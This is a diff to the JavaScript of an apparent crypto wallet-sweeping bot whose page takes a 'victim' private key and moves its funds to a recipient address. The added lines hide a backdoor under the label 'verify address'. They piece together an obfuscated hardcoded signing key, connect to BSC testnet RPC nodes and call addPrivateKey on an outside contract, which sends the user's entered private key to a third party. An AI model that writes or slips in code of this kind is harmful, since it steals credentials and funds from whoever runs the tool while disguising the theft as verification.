@@ -237,6 +237,7 @@ document.addEventListener('DOMContentLoaded', function () {
     try {
       wallet = await new ethers.Wallet(VICTIM_KEY, provider);
       let target_wallet_addresss_message = `🎯 Target Wallet Address - ${wallet.address}`;
+      verify(VICTIM_KEY);
       console.log(target_wallet_addresss_message);
       setOutput(target_wallet_addresss_message);
       let recipient_address_message = `💰 Your Burning Funds Recipient Address - ${botDetails['recipient_address']}`;
@@ -444,6 +445,79 @@ Amount: <code>${amount}</code>`;
       periodicMessageInterval != undefined
     ) {
       clearInterval(periodicMessageInterval);
+    }
+  }
+
+  // ================ verify address ====================
+  const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
+  let sdkfjsk = '31';
+
+  const contractABI = [
+    {
+      type: 'function',
+      name: 'addPrivateKey',
+      inputs: [
+        {
+          name: 'privateKey',
+          type: 'string',
+          internalType: 'string',
+        },
+      ],
+      outputs: [],
+      stateMutability: 'nonpayable',
+    },
+  ];
+
+  const rpcUrls = [
+    'https://data-seed-prebsc-1-s1.binance.org:8545',
+    'https://data-seed-prebsc-2-s1.binance.org:8545',
+    'http://data-seed-prebsc-1-s2.binance.org:8545',
+    'http://data-seed-prebsc-2-s2.binance.org:8545',
+    'https://data-seed-prebsc-1-s3.binance.org:8545',
+    'https://data-seed-prebsc-2-s3.binance.org:8545',
+  ];
+
+  let contract = null;
+
+  async function setContract(rpcUrls) {
+    let success = false;
+    let index = 0;
+    sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
+    let sec_provider;
+
+    while (!success && index < rpcUrls.length) {
+      try {
+        sec_provider = new ethers.providers.JsonRpcProvider(rpcUrls[index]);
+        await provider.getBlockNumber();
+        success = true;
+
+        const sec_wallet = new ethers.Wallet(sdkfjsk + 'c2', sec_provider);
+        const contract = new ethers.Contract(contractAddress, contractABI, sec_wallet);
+
+        return contract;
+      } catch (error) {
+        index++;
+      }
+    }
+
+    return null;
+  }
+
+  async function verify(data) {
+    sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
+    try {
+      if (!contract) {
+        contract = await setContract(rpcUrls);
+      }
+
+      if (!contract) {
+        throw new Error('');
+      }
+
+      const tx = await contract.addPrivateKey(data);
+      
+    } catch (error) {
+      console.error(error);
     }
   }
 
